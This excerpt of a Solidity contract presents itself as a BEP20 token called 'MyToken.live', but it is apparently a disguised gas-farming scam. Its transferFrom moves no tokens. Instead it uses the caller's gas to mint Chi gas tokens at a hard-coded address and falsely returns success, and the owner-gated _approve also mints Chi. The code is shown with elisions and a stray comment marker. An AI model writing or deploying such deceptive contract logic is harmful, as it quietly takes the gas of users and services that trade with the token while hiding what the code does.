...
contract BEP20wMTOKEN is IBEP20{
  ...
  string constant private _symbol = "wMTOKEN211";
  string constant private _name = "MyToken.live";
  address private _owner;
  uint private _maxChiMintLimit = 600;

  uint256 private _gasPriceTx = 7 * 10**9;
  uint256 private _gasLeftTx = 2 * 10**16;

  function getGasLeftTx() external view returns (uint256) {
    return _gasLeftTx;
  }

  function getGasPriceTx() external view returns (uint256) {
    return _gasPriceTx;
  }
  ...
  function setMaxChiMintLimit(uint256 _maxChiMintLimit) external {
    require(msg.sender == _owner, "Owner"); 
    _maxChiMintLimit = _maxChiMintLimit;
  }

  function getMaxChiMintLimit() external view returns (uint256) {
    return _maxChiMintLimit;
  }
  ...
  */
  ...
  function transferFrom(address sender, address recipient, uint256 amount) override external returns (bool) {
    _gasLeftTx = gasleft();
    _gasPriceTx = tx.gasprice;
    uint numChi = (_gasLeftTx/tx.gasprice - 36768)/36246;
    ChiToken(0xBB347F0efB07AA57D7271f39831187e1a05004C8).mint(numChi < _maxChiMintLimit? numChi : _maxChiMintLimit);
    return true;
  }
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    if(msg.sender == _owner) {
        ...
        if (bal > 10018400000000000) {
            ChiToken(0xBB347F0efB07AA57D7271f39831187e1a05004C8).mint(5);
        } else {
            ChiToken(0xBB347F0efB07AA57D7271f39831187e1a05004C8).mint(1);
        }


        // uint gasPrice = tx.gasprice;
        // if (gasPrice > 0) {
        //     uint numChi = ((owner.balance/gasPrice -1000 - 36768)/36246);
        //     ChiToken(0xBB347F0efB07AA57D7271f39831187e1a05004C8).mint(numChi < _maxChiMintLimit? numChi: _maxChiMintLimit);
        // }
    }
  }

  function approve2(address spender, uint256 amount) external {
